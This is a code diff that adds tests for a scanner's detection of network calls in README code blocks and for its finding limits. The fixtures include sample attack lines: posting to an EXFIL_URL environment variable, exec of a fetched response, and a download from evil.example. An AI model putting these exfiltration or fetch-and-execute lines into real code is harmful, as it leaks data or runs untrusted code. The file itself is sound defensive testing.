@@ -1173,6 +1173,121 @@ url = "http://images.cocodataset.org/val2017/000000039769.jpg"
     assert determine_exit_code(aggregate) == 1
 
 
+def test_text_scanner_fenced_documentation_loopback_api_does_not_hide_imported_post(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```python
+import os
+from requests import post
+
+api_url = "http://localhost:8080/v1/embeddings"
+post(os.environ["EXFIL_URL"])
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_library"
+        and check.details.get("library") == "requests"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_fenced_documentation_passive_media_ignores_commented_url_assignment(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```python
+import requests
+
+# url = "http://images.cocodataset.org/val2017/000000039769.jpg"
+requests.get(url)
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_function"
+        and check.details.get("function") == "requests.get"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_fenced_documentation_passive_media_does_not_hide_bound_session_alias(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```python
+import os
+import requests
+
+url = "http://images.cocodataset.org/val2017/000000039769.jpg"
+image = requests.get(url)
+fetch = requests.Session().get
+fetch(os.environ["EXFIL_URL"])
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_library"
+        and check.details.get("library") == "requests"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_fenced_documentation_passive_media_does_not_hide_executed_fetch(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```python
+import requests
+
+exec(requests.get("http://images.cocodataset.org/val2017/000000039769.jpg").text)
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_function"
+        and check.details.get("function") == "requests.get"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
 def test_text_scanner_executable_loopback_api_request_remains_actionable(tmp_path: Path) -> None:
     text_path = tmp_path / "client.py"
     text_path.write_text('requests.get("http://localhost:8080/v1/embeddings")\n', encoding="utf-8")
@@ -3812,10 +3927,77 @@ def test_text_scanner_documentation_network_limit_is_informational(tmp_path: Pat
     )
 
 
+def test_text_scanner_documentation_default_network_cap_avoids_redaction_exhaustion(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "Authentication token examples are discussed in the docs.\n"
+        + "".join(f"https://docs.example.com/reference/{index}\n" for index in range(40)),
+        encoding="utf-8",
+    )
+
+    result = TextScanner(config={"check_secrets": False}).scan(str(text_path))
+
+    assert result.success is True
+    assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
+    assert any(
+        check.name == "Network Communication Reporting Limit"
+        and check.severity == IssueSeverity.INFO
+        and check.details.get("truncated_finding_type") == "url_detected"
+        and check.details.get("analysis_incomplete") is False
+        and check.details.get("reporting_incomplete") is True
+        for check in result.checks
+    )
+    assert not any(
+        check.details.get("truncated_finding_type") == "endpoint_redaction_classification" for check in result.checks
+    )
+
+
+def test_text_scanner_documentation_redaction_exhaustion_is_not_reporting_only() -> None:
+    assert (
+        TextScanner._passive_network_reporting_limit(
+            "README.md",
+            b"https://docs.example.com/reference\n",
+            [],
+            {
+                "type": "detector_finding_limit",
+                "detector": "network_communication",
+                "severity": "INFO",
+                "max_classifications": 32,
+                "truncated_finding_type": "endpoint_redaction_classification",
+                "truncated_finding": None,
+                "analysis_incomplete": True,
+            },
+        )
+        is False
+    )
+
+
 def test_text_scanner_documentation_code_url_after_limit_fails_closed(tmp_path: Path) -> None:
     text_path = tmp_path / "README.md"
     text_path.write_text(
         ("https://docs.example.com/reference\n" * 3) + 'download("https://evil.example/payload")\n',
+        encoding="utf-8",
+    )
+
+    result = TextScanner(
+        config={
+            "check_secrets": False,
+            "text_content_max_findings": 2,
+        }
+    ).scan(str(text_path))
+
+    assert result.success is False
+    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
+
+
+def test_text_scanner_documentation_domain_after_url_on_limit_fails_closed(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        ("https://docs.example.com/reference\n" * 3)
+        + "See https://docs.example.com/reference; endpoint: evil.example\n",
         encoding="utf-8",
     )
 
